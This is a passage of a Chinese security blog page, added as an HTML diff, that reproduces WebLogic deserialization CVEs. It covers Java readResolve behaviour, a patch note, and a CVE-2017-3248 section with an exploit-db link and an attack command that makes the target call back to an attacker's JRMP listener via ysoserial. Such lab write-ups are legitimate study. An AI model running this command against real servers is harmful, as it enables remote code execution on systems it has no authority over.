class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Singleton obj1 = Singleton.getInstance();</span><br><span class="line">        Singleton obj2 = (Singleton) PayloadRunner.run(obj1);</span><br><span class="line">        System.out.println(obj1 == obj2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的输出为False。因为<code>obj2</code>是通过反射调用构造函数来创建的。我们想要让obj2是<code>SINGLETON</code>指向的对象，就得通过定义<code>readResolve</code>方法实现。</p>
+<p>当<code>Singleton</code>中定义了<code>readResolve</code>方法后，会在反序列化的最后通过反射调用它，并将它的返回值作为最后的反序列化结果（代码在前面部分已经给出了）。</p>
+<p>下面的例子中可以看到，当定义了<code>readResolve</code>方法后，代码的输出变为了True：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton SINGLETON = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Singleton obj1 = Singleton.getInstance();</span><br><span class="line">        Singleton obj2 = (Singleton) PayloadRunner.run(obj1);</span><br><span class="line">        System.out.println(obj1 == obj2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//True</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="修复方式-2"><a href="#修复方式-2" class="headerlink" title="修复方式"></a>修复方式</h3><p>查阅资料得知：WebLogicServer 10.3.6.0.160719 的版本，在打了 “Patch 23094342” 补丁之后将<code>MarshallObject</code>加入了黑名单（应该也有<code>StreamMessageImpl</code>）。</p>
+<p>目前没找到白嫖的补丁。 </p>
+<h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>JRMP(Java Remote Message Protocol</p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现脚本<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553%E3%80%82">https://www.exploit-db.com/exploits/44553。</a></p>
+<p>将exploit.py中的十六进制数据写到文件看下。</p>
+<ol>
+<li><p>启动JRMPListener：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击方执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py 192.168.242.128 7001 ..\ysoserial.jar 192.168.242.1 1234 JRMPClient</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+</li>
+</ol>
+<h3 id="漏洞详解-3"><a href="#漏洞详解-3" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p>rmi官方文档：<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmiTOC.html">https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmiTOC.html</a></p>
+<p>rmi流程-源码级别：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2223">https://xz.aliyun.com/t/2223</a></p>
+<p>jep290：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1194/#jep290">https://paper.seebug.org/1194/#jep290</a></p>
+<p>重新审视RMI：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6660">https://xz.aliyun.com/t/6660</a></p>
+<p>漏洞复现：<a target="_blank" rel="noopener" href="https://y4er.com/post/weblogic-jrmp/">https://y4er.com/post/weblogic-jrmp/</a></p>
+<p>ysoserial JRMP模块分析，没讲清楚payload/Client是怎么去请求exploit/Server的：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2650/">https://xz.aliyun.com/t/2650/</a></p>
+<p>payload/Client：<a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/106971632?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242#1%20payloads%2FJRMPClient">https://blog.csdn.net/whatday/article/details/106971632?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242#1%20payloads%2FJRMPClient</a></p>
+
+    </div>
+
+    <div>全文完。</div>
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">weblogic反序列化漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eweblogic"><span class="toc-text">[-]关于weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#t3%E5%8D%8F%E8%AE%AE"><span class="toc-text">t3协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="toc-text">漏洞详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC"><span class="toc-text">适用版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-text">修复方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-text">CVE-2016-0638</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3-1"><span class="toc-text">漏洞详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC-1"><span class="toc-text">[-] 适用版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F-1"><span class="toc-text">[-] 修复方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-text">CVE-2016-3510</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3-2"><span class="toc-text">漏洞详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F-2"><span class="toc-text">修复方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-3248"><span class="toc-text">CVE-2017-3248</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3-3"><span class="toc-text">漏洞详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-1"><span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+</div>
+<div class="share" style="width: 100%;">
+</div>
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/11/19/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="next" title="虚拟机类加载机制">
+          虚拟机类加载机制
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/12/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0rmi%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/" rel="prev" title="深入学习rmi工作原理">
+            深入学习rmi工作原理
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" target="_blank" rel="noopener" href="https://blog.0xff000000.com">首页</a> |
+        <a class="bottom-item" href="https://0xff000000.com" target="_blank">主站</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu/hexo-theme-xoxo" target="_blank">Theme xoxo</a>
+    </div>
+</footer>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+</body>
+</html>
